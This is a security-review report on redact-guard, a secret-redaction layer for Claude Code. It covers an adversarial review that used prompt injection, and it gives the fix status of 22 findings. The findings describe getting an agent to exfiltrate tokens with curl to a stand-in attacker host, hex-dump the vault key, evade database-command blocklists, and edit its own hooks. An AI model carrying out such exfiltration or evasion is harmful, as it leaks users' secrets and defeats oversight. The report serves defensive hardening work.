# Independent adversarial review: findings and status

An independent reviewer worked only from the code and its behaviour, using the checklist in
[SECURITY-REVIEW.md](SECURITY-REVIEW.md). It attacked a copy of redact-guard through the real
Claude Code CLI 2.1.329 with a scripted prompt-injection model, plus unit-level probes. The
result was **3 Critical, 7 High, 7 Medium and 5 Low** findings. The reviewer's verdict was
"not safe to rely on as described".

All 22 were then worked through. The reviewer's attack scripts were re-run against the fixed
code; the before/after numbers are below. Each fix has regression tests: `tests/test_hooks.py`,
`tests/test_review_regressions.py`, `tests/test_user_keys.py` and the additions in
`tests/test_proxy_mode.py`.

Status values:
- **Fixed**: closed, with a regression test.
- **Mitigated**: much harder, not closed.
- **Boundary**: code inside the session can't fully close it, so the stated outside protection is required.

## Re-run results

| Probe | Before | After |
|---|---|---|
| `b_restore.py` + real CLI `exfil` (PAT in git remote → `curl`) | token restored, reached the attacker | stored as `SECRET`, command replaced by `exit 126`; Monitor `ws` URL gets the token, not the value |
| real CLI `key` (`od` the vault key through globs) | whole vault decrypted from the model's view | command refused; 0 key bytes reach the model; canary refuses key bytes in hex/base64; isolated install makes the key unreadable to the user |
| real CLI proxy mode, `curl --data-binary @.env http://<attacker>` | delivered | `egress_denied`, refused by the proxy (with `egress.enabled`) |
| `a_detect.py` (76 formats) | 31 leaking, 1 crash | 9 leaking, all config-dependent or exotic (see A-2) |
| A8 exact-match variants | 7 leaking | 2 (a dictionary word on purpose; a zero-width split inside the value) |
| `d_uplink.py` (Remote Control frames) | 10 leaking | 1 (a person's name with no names list: detection, not exemption) |
| `e_policy.py` (95 DB-access evasions) | 65 allowed | 12 allowed, all opaque (`make db-shell`, `python3 db.py`, `cat data/app.data`) |
| `g_redos*.py` (pathological input) | up to 13 min per 100 KB | < 0.4 s for every case, 16–64 KB each (bounded regexes) |
| aiohttp source over-redaction | 797 substitutions | 27 |

## Findings

| ID | Sev | Finding | Status | What changed |
|---|---|---|---|---|
| B-1 | Critical | A token in URL userinfo (`https://ghp_…@github.com`) was classed USER and restored into shell commands | **Fixed** | A user part with no password (except ssh/sftp/scp), or one that looks like a token, is now SECRET. Every non-file restore also withholds any value that looks like a credential, whatever its class. |
| F-1 | Critical | Bash could hex-dump the vault key and the vault, and the model side decrypted every secret | **Fixed** (isolated install) / **Mitigated** (per-user) | Isolated installs are now the default:<br>• Windows: SYSTEM task, state ACL'd to SYSTEM and Administrators.<br>• Linux: `redact-guard` system user, `/var/lib/redact-guard` 0700.<br>Both verified: the user gets "Permission denied", and globs can't list the folder.<br>Per-user installs also get: the canary refuses key bytes in hex (od/xxd/hexdump/`.hex()`/separated) and base64; glob, 8.3 short-name and `$HOME` forms of vault paths are blocked; `doctor` reports key readability. |
| E-1 | Critical | Local DB files readable through scripts or innocent names | **Mitigated / Boundary** | The hook recognises DB files by magic bytes (SQLite, pg_dump, Redis RDB, Berkeley DB, Access, DuckDB, MDF) under any name. That covers Read and any path in a shell command.<br>Shell checks also block `-m sqlite3`, `import sqlite3` and `__import__(`. Scripts Claude writes that contain DB driver code are recorded and can't be run.<br>More file globs: SQLite `-wal`/`-shm`/`-journal`, backups, `*.sql.gz`.<br>The README states the limit honestly. |
| C-1 | High | A hostile repo's `.claude/settings.json` redirected traffic, and the hook accepted `{"ok":true}` | **Fixed** | The prompt hook sends a nonce to the endpoint Claude Code will really use and requires HMAC(secret, nonce). The secret comes from a fixed path, never from env.<br>Project settings that set routing, interpreter or telemetry env, hooks, `apiKeyHelper` or `disableAllHooks` block the prompt.<br>Verified against the real proxy process and a spoofing server. |
| C-2 | High | NO_PROXY forms (`api.anthropic.com:443`, `.anthropic.com.`, `*`, CIDR) bypassed proxy mode | **Fixed** | Normalised like Node: ports, trailing dots, `*.` and case stripped. `*`, IP ranges and anything that covers an Anthropic host are refused. ALL_PROXY is considered. |
| C-3 | High | In gateway mode, an inherited HTTPS_PROXY carried the plaintext request to the corporate proxy | **Fixed** | Gateway settings now set NO_PROXY to loopback. The hook and `doctor` fail if a proxy is set and the gateway host isn't excluded. |
| A-1 | High | k8s/ECS name/value pairs, YAML block scalars, .NET `<add key value>`, tfstate outputs, .pgpass, some AWS keys, PEM body lines | **Fixed** | New structured-pairs detector covers name/value pairs in YAML, JSON and XML, block scalars, Terraform `sensitive` values and `.pgpass`.<br>PEM body lines are caught without the BEGIN line.<br>Obfuscated keys are normalised before detection: zero-width characters, Cyrillic and Greek look-alikes, HTML entities, `\uXXXX` and string concatenation. |
| B-2 | High | Exfiltrating on-disk secrets with curl or git push when there's no network boundary | **Fixed** (proxy mode + egress) / **Boundary** | The proxy enforces `egress.allow` for every non-Anthropic host when enabled, and the shell inherits HTTPS_PROXY. Verified with the real CLI.<br>`github.com` was removed from the default sandbox and egress allowlists, because it accepts pushes.<br>Native Windows processes that ignore HTTPS_PROXY need VM-level egress filtering; the README says so. |
| G-1 | High | Hooks could fail open or be hijacked (PYTHONPATH/PYTHONHOME, bad stdin) | **Fixed / Boundary** | Hooks run as `<absolute venv python> -I`, and the hijack is verified ignored. Unreadable or non-object input exits 2.<br>**Boundary:** a *deleted* interpreter gives a non-blocking error in Claude Code. The isolated installs make it read-only, and `doctor` checks it. |
| E-2 | High | DB-command blocklist bypassed by ordinary shell forms | **Mitigated / Boundary** | Added checks:<br>• DB clients named anywhere in an indirect execution (pipes into shells, `-c`/`-e` interpreters, `subprocess`, `child_process`, `exec`, `iex`, `Start-Process`, `& (…)`, xargs, `find -exec`, `$(…)`, `docker run`, `kubectl run`)<br>• obfuscation undone: carets, in-word backslashes, `'a'+'b'`<br>• dynamic command names and `$'\x..'`<br>• raw socket tools, SSH forwarding and tunnels, HTTP DB APIs<br>• more cloud CLI forms, `k`/`oc` exec, more PowerShell, `pg_isready` and friends<br>• SQL or DB URIs in MCP tool inputs<br>65 → 12 evasions; the remaining ones are opaque. Ordinary dev commands are regression-tested as allowed. |
| B-3 | Medium | Unknown tools (SendMessage, RemoteTrigger, MCP resource tools, Monitor `ws`) got identities restored | **Fixed** | Restore is default-deny. "Other" tools get nothing. For shell tools only `command` and `cwd` are restored. |
| D-1 | Medium | The uplink skipped values under `name`/`code`/`token`/`*_id` keys and sent form bodies raw | **Fixed** | Structural keys keep a value only if it *looks* structural (id, enum, timestamp, tool name). Credential keys are exempt only outside content subtrees. JSON keys give context (`{"token": …}`). Form bodies are parsed and redacted. Auth-path regexes are anchored. The canary works from 4 characters. |
| A-2 | Medium | PII gaps | **Mitigated** | Added:<br>• Turkish landlines<br>• labelled IDs with spaces or dashes<br>• IBAN in any case<br>• Diners and dotted cards<br>• managed cloud DB hostnames<br>• DB error messages (`server at "x"`, `for user "x"`, `'u'@'h'`)<br>• case, adjacency and base64 variants of known secrets<br>**Not covered:** hostnames outside configured domains, names without a names list, decimal/hex/full-width IPs, zero-width-split values. Documented. |
| A-3 | Medium | `tools[]` descriptions/schemas, `search_result` and unknown blocks were neither redacted nor checked by the canary | **Fixed** | Tool descriptions and schema prose (description/default/examples/title) are redacted; names, enums and types are kept. Unknown blocks are walked recursively, skipping protocol keys. The canary view includes tools. |
| F-2 | Medium | Claude could edit the hooks or config to weaken the next session | **Fixed** | `Edit(//<install>/**)` and `Write(…)` deny rules. The isolated installs make the code root-owned or read-only for Users. |
| G-2 | Medium | A `.pgpass`-style line crashed redaction; the exception text went to the audit log; `UNINSPECTABLE=pass` forwarded the text body | **Fixed** | The prefix parser reads digits only, and `.pgpass` is detected properly. Logs record exception *types* only. `pass` applies only to genuinely binary bodies. |
| C-4 | Medium | OTEL prompt logging exported unredacted prompts | **Fixed** | Settings pin `OTEL_LOG_USER_PROMPTS=0` and `OTEL_LOG_TOOL_DETAILS=0`. The hook and `doctor` block or flag re-enabling them. |
| G-3 | Low | Quadratic regexes let a planted file stall the event loop | **Fixed** | Key prefixes/suffixes bounded to 64 characters, name-email parts bounded, private-key body bounded to 16 KB. The exact-match regex (recompiled on every vault change) is replaced by an incremental index, which also made the test suite 3× faster. |
| G-4 | Low | Streaming restore split a token after an inner `R` | **Fixed** | Holds back from the earliest possible token start in the tail. |
| H-1 | Low | The git hook missed `++…` lines, binary files and `--no-verify`/`core.hooksPath` | **Fixed** | Uses `git diff --text` with `grep -a`, and only `+++ b/` headers are skipped. Verified on real repos. Claude's shell can't use `--no-verify`, `commit -n` or `core.hooksPath`. |
| I-1 | Low | Over-redaction of ordinary code identifiers | **Fixed** (mostly) | Type annotations, identifiers passed by name, Python keywords and attribute chains (`flow.request.host`, `self.local`) stay readable. Wordy real values (`PASSWORD=changeme`, quoted `"MySecretPass"`) are still redacted. |
| D-2 | Low | Smaller gaps: unanchored auth paths, compressed SSE skipping checks, response-restore failures forwarded, `doctor` blind spots, overstated docs | **Fixed** | Auth paths anchored. Compressed model streams and uncheckable responses are refused (502). `doctor` covers isolation, hook interpreter, project settings, OTEL and gateway-behind-proxy. README rewritten to state what holds and what doesn't. |

## Not testable in the build environment

These are the same limits the reviewer had:

- The Linux Bash sandbox (no bubblewrap).
- Native Windows: the PowerShell scripts and the isolated install were reviewed, but not run.
- Hooks inside the real CLI. They were tested as subprocesses fed real hook JSON, and against the real proxy process.
- Managed settings.
- Live Remote Control.
- Docker / container mode.

The Linux isolated install *was* run, with systemd stubbed:
- The service user owns a 0700 state folder.
- The user gets "Permission denied" on the key.
- The prompt hook verified the proof using `/etc/redact-guard/hook-secret`.
- `doctor` passed every check except the sandbox dependencies, which really are missing there.
